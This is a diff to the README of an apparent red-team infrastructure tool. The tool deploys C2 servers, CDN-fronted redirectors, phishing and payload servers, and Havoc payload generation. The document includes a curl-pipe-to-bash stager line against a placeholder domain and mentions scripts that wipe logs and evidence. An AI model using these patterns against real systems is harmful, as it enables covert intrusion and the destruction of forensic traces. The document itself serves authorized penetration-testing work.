@@ -76,10 +76,25 @@ venv/bin/python deploy.py --auto-teardown # tear down automatically when a deplo
 venv/bin/python deploy.py --help-examples
 ```
 
-Main menu entries: Attack Box, C2 Infrastructure, Redirector, Phishing
-Infrastructure, Payload Server, Email Tracker, Chat Server, Privacy Server
-(Phantom), Tools & Utilities, Cleanup & Teardown. Logging Server, Share-Drive
-and Hashtopolis are placeholders.
+Main menu entries: Attack Box, C2 Infrastructure, Redirector (including a
+CDN-fronted redirector), Phishing Infrastructure, Payload Server, Email
+Tracker, Logging Server (RedELK), Share-Drive (Nextcloud over Tailscale),
+Hashtopolis, Chat Server, Privacy Server (Phantom), Tools & Utilities, Cleanup
+& Teardown.
+
+Team services are locked to the operator by construction:
+
+| Entry | What it deploys | Who can reach it |
+|---|---|---|
+| Email Tracker | Flask pixel service under `/opt/tracker` behind nginx | pixel public; dashboard from the operator /32 only |
+| Logging Server | RedELK (`limited` profile) in containers; nothing onboarded | Kibana from the operator /32; beats port 5044 only to hosts named at deploy time; onboarding packages stay on the host under `/opt/redelk/` |
+| Share-Drive | Phantom's Nextcloud plus Tailscale | the tailnet only: no public web ports, self-signed certificate, nothing in DNS or certificate logs |
+| Hashtopolis | upstream compose stack on loopback behind nginx with TLS | UI and agent API from the operator /32 and the agent addresses given at deploy time |
+| CDN-Fronted C2 Redirector | a redirector plus the provider's edge (Azure Front Door) in one deployment | beacons talk to the edge hostname; the origin admits only the edge network and drops requests without this deployment's edge identifier |
+
+The Tools menu's Payload Generation Tools entry runs the Havoc payload
+generator on a deployed C2 (from its deployment record), pulls the results to
+`payloads/<deployment_id>/`, or syncs them to the C2's redirector.
 
 Every workload menu first asks for a provider and offers only the providers
 that can serve that workload and subtype. Tools & Utilities holds SSH key
@@ -244,7 +259,7 @@ Step-by-step recipes, skeletons and the validation errors you may hit:
 | `venv/bin/python -m pytest tests/ -q` | registry validity, adapter lifecycles, provider/workload isolation, every playbook parses |
 | `venv/bin/python scripts/audit_provider_coverage.py` | the provider/workload coverage matrix |
 | `venv/bin/python scripts/test_provider_workload_live.py --provider <p> --workload <w>` | dry run; add `--activate` for a real deploy, SSH verification, repeat, standalone teardown and inventory restore |
-| `venv/bin/python scripts/test_azure_phantom_live.py --activate` | the Phantom handoff route on Azure |
+| `venv/bin/python scripts/test_azure_phantom_live.py --activate [--service share]` | the Phantom handoff route on Azure, or the share drive built on it |
 | `venv/bin/python smoke_test_webrunner.py --activate --operator-ip <ipv4>` | one-node Linode WEBRUNNER lifecycle |
 
 Live runs write evidence under `logs/<provider>-<workload>-live/<deployment_id>/`
@@ -272,7 +287,7 @@ utils/deployment_engine.py dispatch, playbook execution, deployment records
 utils/cleanup_engine.py    teardown, key and log hygiene
 scripts/                   coverage audit, live harness, Azure smoke and automation setup
 tests/                     unit suite, fake driver, extension contracts
-docs/                      ARCHITECTURE.md, EXTENDING.md
+docs/                      ARCHITECTURE.md, EXTENDING.md, OPSEC.md
 deployments/<provider>/    durable state and archive
 logs/                      deployment logs, records and live evidence
 ghost_protocol/            Phantom (submodule)
@@ -318,6 +333,8 @@ curl -s https://cdn.your-domain.com/linux_stager.sh | bash
 
 ## Security considerations
 
+- `docs/OPSEC.md` lists, per module, what lands on the host, in the
+  provider's metadata and on the controller, and what a teardown removes.
 - Every server carries `/root/Tools/secure-exit.sh` to wipe operational data
   and `/root/Tools/clean-logs.sh` to remove evidence.
 - Enable port randomization and zero-logs for sensitive operations.
